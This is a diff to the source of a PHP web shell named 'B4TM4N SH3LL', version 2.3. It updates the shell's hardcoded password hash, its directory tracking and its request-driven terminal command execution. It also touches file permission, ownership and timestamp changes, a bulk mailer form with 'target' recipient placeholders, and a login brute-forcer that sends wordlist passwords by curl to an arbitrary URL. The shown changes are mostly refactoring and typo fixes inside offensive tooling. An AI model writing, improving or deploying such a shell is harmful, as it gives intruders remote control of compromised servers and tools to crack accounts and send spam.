@@ -18,7 +18,7 @@ $config=[
 	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
 	"title"   => "B4TM4N SH3LL",                             // Title
 	"version" => "2.3",                                      // Version
-	"debug"   => true                                        // Debug Mode
+	"debug"   => false                                       // Debug Mode
 ];
 
 session_start(); // Session Start
@@ -172,7 +172,7 @@ else
 	ini_set('display_startup_errors',0);
 }
 
-ini_set('max_execution_time','60');
+ini_set('max_execution_time','600');
 ini_set('memory_limit','256M');
 
 $userAgent=B64D("FT06ACQoAXYrvHYXMUIMMV5e").$config["version"]; 	// Powered by B4TM4N
@@ -404,8 +404,9 @@ function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);e
 <body>
 <div id="wrapper"><?php
 
-$dir=any("d",$_REQUEST)?urld($_REQUEST['d']):getcwd();
-$mapdir=any("r",$_REQUEST)?dirname(urld($_REQUEST['r'])):$dir;
+$cur=any("c",$_SESSION)?urld($_SESSION['c']):getcwd();
+$dir=any("d",$_REQUEST)?urld($_REQUEST['d']):$cur;
+$map=any("r",$_REQUEST)?dirname(urld($_REQUEST['r'])):$dir;
 
 function Unix() 
 {
@@ -968,7 +969,7 @@ printf("<div id='header'>
 		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
 		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
 		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['version'],
-		MainMenu(),MapDrive($mapdir),MapDirectory($mapdir),$mapdir
+		MainMenu(),MapDrive($map),MapDirectory($map),$map
 );
 
 if(any("g",$_REQUEST))
@@ -991,7 +992,7 @@ if(any("g",$_REQUEST))
 
 if(any("d",$_REQUEST)||request_uri==script_name)
 {
-	$_SESSION['curdir']=$dir;
+	$_SESSION['c']=urle($dir);
 
 	if(any("file",$_REQUEST)&&$_REQUEST['file']=="New File")
 	{
@@ -1164,7 +1165,6 @@ if(any("d",$_REQUEST)||request_uri==script_name)
 if(any("r",$_REQUEST))
 {
 	$file=file_exists(urld($_REQUEST["r"]))?strval(urld($_REQUEST["r"])):exit('File Not Found');
-	$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
 	$status=any("status",$_SESSION)?$_SESSION['status']:"";
 	$back=php_self."?d=".urle($dir);
 
@@ -1242,7 +1242,7 @@ if(any("r",$_REQUEST))
 		$active=any($idxkey,$_REQUEST)&&$_REQUEST[$idxkey]==$idxval?"class='active'":"";
 		if($key=="Delete")
 		{
-			$nu.="<li><a ".$active." href='".$val.urle($file)."' onclick=\"return confirm('Sure !?');\">".$key."</a></li>";
+			$nu.="<li><a ".$active." href='".$val.urle($file)."' onclick=\"return confirm('Delete it ?');\">".$key."</a></li>";
 		}
 		elseif($key=="Back")
 		{
@@ -1301,7 +1301,7 @@ if(any("r",$_REQUEST))
 			}
 			else
 			{
-				$_SESSION['status']="Whoops,something went wrong...";
+				$_SESSION['status']="Whoops, something went wrong...";
 			}
 			header("location:".php_self."?a=e&r=".urle($file));
 		}
@@ -1323,7 +1323,7 @@ if(any("r",$_REQUEST))
 			$newname=$path['dirname']._.trim($_REQUEST['name']);
 			if(!rename(trim($file),$newname)) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1348,7 +1348,7 @@ if(any("r",$_REQUEST))
 			$octal=octdec($_REQUEST['octal']);
 			if(!chmod(trim($file),$octal)) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1380,7 +1380,7 @@ if(any("r",$_REQUEST))
 			$own=$_REQUEST['own'];
 			if(!chown(trim($file),$own)) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1412,7 +1412,7 @@ if(any("r",$_REQUEST))
 			$grp=$_REQUEST['grp'];
 			if(!chgrp(trim($file),$grp)) 
 			{
-				$_SESSION['status']='Whoops,something went wrong...';
+				$_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1437,7 +1437,7 @@ if(any("r",$_REQUEST))
 			$time=$_REQUEST['time'];
 			if(!touch(trim($file),strtotime($time))) 
 			{
-			    $_SESSION['status']='Whoops,something went wrong...';
+			    $_SESSION['status']='Whoops, something went wrong...';
 			} 
 			else 
 			{
@@ -1566,7 +1566,7 @@ if(any("r",$_REQUEST))
 				{
 					if(!copy(trim($source),trim($dest))) 
 					{
-					    $_SESSION['status']='Whoops,cannot copying...';
+					    $_SESSION['status']='Whoops, cannot copying...';
 					} 
 					else 
 					{
@@ -1577,7 +1577,7 @@ if(any("r",$_REQUEST))
 				{
 					if(!copy(trim($source),trim($dest))) 
 					{
-					    $_SESSION['status']='Whoops,cannot moving...';
+					    $_SESSION['status']='Whoops, cannot moving...';
 					} 
 					else 
 					{
@@ -1588,14 +1588,14 @@ if(any("r",$_REQUEST))
 					   }
 					    else
 					    {
-					    	$_SESSION['status']='Whoops,just copying...';
+					    	$_SESSION['status']='Whoops, just copying...';
 					   }
 					}
 				}
 			}
 			else
 			{
-				$_SESSION['status']="Whoops,File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
+				$_SESSION['status']="Whoops, File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
 			}
 
 			if($_REQUEST['a']=='cp')
@@ -2009,8 +2009,6 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=="terminal")
 	{
-		$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
-
 		printf("
 			<div id='terminal'>
 				<textarea id='prompt-terminal' class='cmd' cols='122' rows='20' readonly>%s</textarea>
@@ -2031,7 +2029,6 @@ if(any("x",$_REQUEST))
 		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals")
 		{	
 			ob_clean();
-			$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
 			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
 			@chdir($dir);
 			$charset='UTF-8';
@@ -2046,7 +2043,6 @@ if(any("x",$_REQUEST))
 		elseif(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals-curdir")
 		{	
 			ob_clean();
-			$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
 			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
 			if (preg_match('/cd (.*)/',$command,$dirx))
 			{
@@ -2059,11 +2055,11 @@ if(any("x",$_REQUEST))
 				{
 					if (is_dir($dirx[1]))
 					{
-						$dir=$dirx[1];
+						$dir=realpath($dirx[1]);
 					}
 				}
 			}
-			$_SESSION['curdir']=$dir;
+			$_SESSION['c']=urle($dir);
 			print '$ '.$dir.':';
 			exit;
 		}
@@ -2201,7 +2197,15 @@ if(any("x",$_REQUEST))
 			"Allow From All",
 			"Satisfy Any"];
 
-		printf("<textarea>%s</textarea>",implode($php_ini,"\n"));
+		printf("
+			<div class='divide'>
+				<div class='divide-left'>
+					<textarea>%s</textarea>
+				</div>
+				<div class='divide-right'>
+					<textarea>%s</textarea>
+				</div>
+			</div>",implode($php_ini,"\n"),implode($htaccess,"\n"));
 	}
 	if($_REQUEST['x']=="php")
 	{	
@@ -2336,7 +2340,7 @@ if(any("x",$_REQUEST))
 							<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>
 							<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>
 							<label>Subject</label><input type='text' id='email-subject' placeholder='What You Waiting For ?' value=''/><br>
-							<label>Attachment (Path)</label><input type='text' id='email-attachment' placeholder='%s' value=''/><br>
+							<label>Attachment (FIlename)</label><input type='text' id='email-attachment' placeholder='%s' value=''/><br>
 							<label>Messages</label><input type='text' id='email-message'/><br>
 							<input type='submit' value='Send' onclick=\"
 
@@ -2366,7 +2370,7 @@ if(any("x",$_REQUEST))
 				</div>
 			</div>
 
-		",$dir._);
+		",php_self);
 
 		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='send')
 		{
@@ -2795,14 +2799,18 @@ if(any("x",$_REQUEST))
 				}
 			}
 
-			printf("<label>Find: '%s' | Found's: %s</label>
+			printf("
+					<form class='new' method=POST action='?x=find'>
+						<input type='text' name='find-value' value='%s'/><input type='submit' name='find-button' value='Find'/>
+						<label>Found's: %s</label>	
+					</form>
 					<div class='auto-number'>
 						<table class='table sortable'>
 							<thead>
 								<tr>
 									<th class='sorttable_nosort' width='15'>No.</th>
 									<th>Directory</th>
-									<th>Filename</th>
+									<th>Found's</th>
 									<th>Modified</th>
 								</tr>
 							<tbody>%s</tbody>
@@ -2811,7 +2819,10 @@ if(any("x",$_REQUEST))
 		}
 		else
 		{
-			print '<font color="red">Whoops,Nothing Find !</font>';
+			print "<form class='new' method=POST action='?x=find'>
+						<input type='text' name='find-value'/><input type='submit' name='find-button' value='Find'/>
+						<font color='red'>Whoops, Nothing to Found's !</font>
+					</form>";
 		}
 	}
 	if($_REQUEST['x']=="update")
@@ -3360,8 +3371,6 @@ if(any("z",$_REQUEST))
 		if(any("url",$_REQUEST)&&any("user",$_REQUEST))
 		{
 			ob_clean();
-			ini_set('max_execution_time','600');
-
 			$url=$_REQUEST['url'];
 			$user=$_REQUEST['user'];
 			$file=GetUrlExists($_REQUEST['passlist'])? 
@@ -3369,7 +3378,6 @@ if(any("z",$_REQUEST))
 			$_REQUEST['passlist'];
 			$words=explode("\n",$file);
 			$length=count($words);
-			
 			foreach ($words as $index => $word) 
 			{
 				$parameter=http_build_query(
@@ -3377,10 +3385,8 @@ if(any("z",$_REQUEST))
 						$_REQUEST['userfield'] => $user,
 						$_REQUEST['passfield'] => $word,
 						'Submit' => 'Submit',
-
 					)
 				);
-
 				$ch=curl_init();
 				curl_setopt($ch,CURLOPT_USERAGENT,$userAgent);
 				curl_setopt($ch,CURLOPT_URL,$url);
@@ -3396,7 +3402,6 @@ if(any("z",$_REQUEST))
 				if ($st==200) 
 				{
 					echo "FOUND'S: $user:$word<br>";
-					ini_set('max_execution_time','60');
 					exit;
 				}
 				else
@@ -3404,7 +3409,6 @@ if(any("z",$_REQUEST))
 					echo htmlspecialchars($ra);
 				}
 			}
-			ini_set('max_execution_time','60');
 			exit;
 		}
 	}
